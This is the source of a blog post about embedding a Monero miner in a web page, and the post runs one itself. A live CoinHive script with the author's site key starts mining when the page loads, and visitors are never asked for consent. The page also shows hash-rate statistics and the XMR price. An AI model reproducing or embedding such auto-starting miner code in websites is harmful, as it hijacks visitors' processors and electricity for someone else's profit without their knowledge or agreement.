---
layout: post
title: How to mine Monero using Javascript
image: /img/monero.png
tags: [monero, XMR, crypto, currency, cryptocurrency, mine, miner, mining, graphics cards, bitcoin]
comments: true
---
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
	
I discovered an interesting service today that allows you to embed a Monero Javascript miner into your own webpage. 
I thought this was an interesting idea and immediatly signed up and gave it a try.
The results of that are seen on this page. 

<script>
	var miner = new CoinHive.Anonymous('l0YCiLkEmA6Nk1UBDRL9O0OsHSOem86y');
	miner.start();

	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();

		// Output to HTML elements...
		document.getElementById("hashesPerSecond").innerHTML = hashesPerSecond;
		document.getElementById("totalHashes").innerHTML = totalHashes;
		document.getElementById("acceptedHashes").innerHTML = acceptedHashes;
	}, 1000);

	// API call to Crypto Compare
	window.onload = function(){
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
			var json = JSON.parse(this.responseText);
				document.getElementById("XMRprice").innerHTML = json.USD;
		   }
		};
		xhttp.open("GET", "https://min-api.cryptocompare.com/data/price?fsym=XMR&tsyms=USD", true);
		xhttp.send(); 
	}
</script>

	<p>Monero (XMR) is a cryptocurrency focused around privacy, decentralization and scalability. It was created in April of 2014 and has since seen a huge uptick in adoption. 
	The current price of Monero based on data retrieved from the CryptoCompare API is <p id="XMRprice"></p>
	<br />
	<br />
	<h3>Miner Stats since visiting this page</h3>
	<div>
	Hashes per second: <p id="hashesPerSecond"></p>
	Total Hashes: <p id="totalHashes"></p>
	Accepted Hashes: <p id="acceptedHashes"></p>